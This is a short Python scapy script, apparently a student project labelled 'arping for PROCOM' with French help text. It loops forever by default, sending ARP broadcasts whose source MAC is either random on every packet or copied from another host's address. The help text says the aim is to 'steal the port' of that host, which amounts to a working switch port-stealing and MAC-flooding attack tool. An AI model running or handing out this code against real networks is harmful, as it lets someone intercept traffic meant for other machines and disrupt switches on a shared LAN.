import scapy.all as scapy
import argparse
import random
import sys

def generate_random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, iface=interface, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] No response received for {ip}. Unable to obtain MAC address.")
        return None

def send_arp_ping(target_ip, source_mac, interface):
    arp_request = scapy.ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", hwsrc=source_mac)
    ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=source_mac) / arp_request
    scapy.sendp(ether_frame, iface=interface, verbose=False)

def arping_equivalent():
    parser = argparse.ArgumentParser(description="my tool arping for PROCOM")
    parser.add_argument("target_ip", type=str, nargs='?', default="10.0.0.99", help="assurez vous que l'addresse 10.0.0.99 par defaut, n'existe pas en faisant un ping")
    parser.add_argument("-I", "--interface", required=True, help="l'interface reseau, peut etre verifié avec ifconfig")
    parser.add_argument("-s", "--ip_source", help="l'ip qu'on veut voler son port (default: random)")
    parser.add_argument("-c", "--count", type=int, help="Nommbre de paquets à envoyer (default: loop)")
    args = parser.parse_args()

    target_ip = args.target_ip
    interface = args.interface

    try:
        if args.count:
            count = args.count
            if args.ip_source:
                source_mac = get_mac(args.ip_source, interface)
                for _ in range(count):
                    send_arp_ping(target_ip, source_mac, interface)
            else:
                for _ in range(count):    
                    source_mac = generate_random_mac()
                    send_arp_ping(target_ip, source_mac, interface)
        else:
            if args.ip_source:
                source_mac = get_mac(args.ip_source, interface)
                while True:
                    send_arp_ping(target_ip, source_mac, interface)
            else:
                while True:    
                    source_mac = generate_random_mac()
                    send_arp_ping(target_ip, source_mac, interface)
        
    except KeyboardInterrupt:
        print("\nInterruption par l'utilisateur. Arrêt du script.")
        sys.exit(1)

def main():
    arping_equivalent()

if __name__ == "__main__":
    main()

